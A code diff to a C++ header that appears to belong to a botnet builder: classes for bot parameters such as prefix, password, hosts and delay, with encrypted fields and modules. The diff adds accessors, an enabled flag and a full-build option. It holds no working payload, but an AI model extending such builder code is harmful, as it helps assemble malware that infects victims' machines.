@@ -84,7 +84,7 @@ private:
 	bool FResultFileNameChanged;
 	TCollection* FParams;
 	TCollection* FModules;
-	TList* FActiveModules;
+	TList*       FActiveModules;
 	TMemoryStream* FFile;   // Загруженный файл
 	TBotParam* FPrefix;     // Префикс бота
 	TBotParam* FPassword;   // Пароль бота
@@ -98,6 +98,8 @@ private:
 	void __fastcall ActivateModules();
 	void __fastcall DeactivateModules();
 	int  __fastcall GetActiveModulesCount();
+	int  __fastcall GetCount();
+	TBotParam*   __fastcall GetParam(int Index);
 	TBotModule*  __fastcall GetActiveModules(int Index);
 protected:
 	void __fastcall virtual ParamValueChanged(TBotParam* Sender);
@@ -110,8 +112,8 @@ public:
 
     TBotModule*     __fastcall AddModule(const char *Name);
 	void            __fastcall LoadSourceFile(const UnicodeString &FileName);
-	TBotParamStatus __fastcall CheckParams(TStrings* Errors);
-	bool            __fastcall Build();
+	TBotParamStatus __fastcall CheckParams(TStrings* Errors, bool FullBuild);
+	bool            __fastcall Build(bool FullBuild);
 	TBotParam*      __fastcall ParamByName(const AnsiString &Name);
     void            __fastcall ClearParams();
 
@@ -134,7 +136,8 @@ public:
 	__property TBotParam* Password = {read = FPassword};
 	__property TBotParam* Delay    = {read = FDelay};
 	__property TBotParam* Hosts    = {read = FHosts};
-
+	__property int        Count = {read = GetCount};
+	__property TBotParam* Params[int Index] = {read = GetParam};
 	// События
     __property TBuilderMessage OnMessage  = {read=FOnMessage, write=FOnMessage};
 };
@@ -149,6 +152,7 @@ private:
 	TBotBuilder* FOwner;
 	TBotModule*  FModule;
 	AnsiString FName;
+	bool  FEnabled;
 	bool  FNotNull;   // Обязательный параметр
 	bool  FEncrypted; // Параметр должен быть шифрованным
 	DWORD FSize;      // Размер буфера параметра
@@ -172,6 +176,7 @@ protected:
 	UnicodeString __fastcall GetDisplayName(void);
 	void __fastcall virtual DoChanged();
 	bool __fastcall virtual Write(PCHAR Buf, DWORD BufSize);
+    bool __fastcall virtual WriteEmptyData(PCHAR Buf, DWORD BufSize);
 	bool __fastcall DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWORD ADataSize);
 	__property PCHAR Data = {read = FData};
 public:
@@ -190,7 +195,8 @@ public:
 	void __fastcall SaveToStrings(TStrings *Strings);
 	void __fastcall LoadFromStrings(TStrings *Strings);
 
-    __property bool Active = {read=GetActive};
+	__property bool Enabled = {read = FEnabled, write = FEnabled};
+	__property bool Active  = {read=GetActive};
 	__property TBotModule*  Module = {read=FModule};
 	__property DWORD Size = {read=FSize};
 	__property bool Encrypted = {read = FEncrypted};
@@ -215,13 +221,12 @@ class TBotPassword : public TBotParam
 private:
 	DWORD FRealSize;
 protected:
-    bool __fastcall Write(PCHAR Buf, DWORD BufSize);
+	bool __fastcall Write(PCHAR Buf, DWORD BufSize);
+	bool __fastcall WriteEmptyData(PCHAR Buf, DWORD BufSize);
 public:
 	__fastcall TBotPassword(TBotBuilder* AOwner, bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title);
 
 };
-
-
 
 
 //*************************************************************
